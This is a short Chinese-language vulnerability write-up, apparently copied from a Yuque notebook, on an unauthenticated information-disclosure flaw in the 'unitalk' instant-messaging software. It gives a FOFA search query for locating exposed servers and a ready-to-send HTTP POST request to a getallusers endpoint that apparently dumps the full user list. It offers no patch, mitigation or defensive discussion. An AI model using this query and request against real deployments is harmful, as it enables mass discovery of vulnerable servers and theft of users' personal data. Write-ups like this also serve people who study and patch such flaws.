# unitalk存在敏感信息泄露漏洞

# 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在敏感信息泄露漏洞

# 二、影响版本
+ unitalk

# 三、资产测绘
+ fofa`title="unitalk"`
+ 特征

![1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13.png](./img/5y4QT2B7hlz5Oba0/1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13-815430.png)

# 四、漏洞复现
```plain
POST /unitalk/v1.0/user/getallusers.json HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35
Content-Type: application/json;charset=UTF-8

{}
```

![1723521050837-41476540-13f8-4fdc-80d8-f22c2fe6081a.png](./img/5y4QT2B7hlz5Oba0/1723521050837-41476540-13f8-4fdc-80d8-f22c2fe6081a-283024.png)



> 更新: 2024-09-05 23:21:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xwkb6kvo30rpcip8>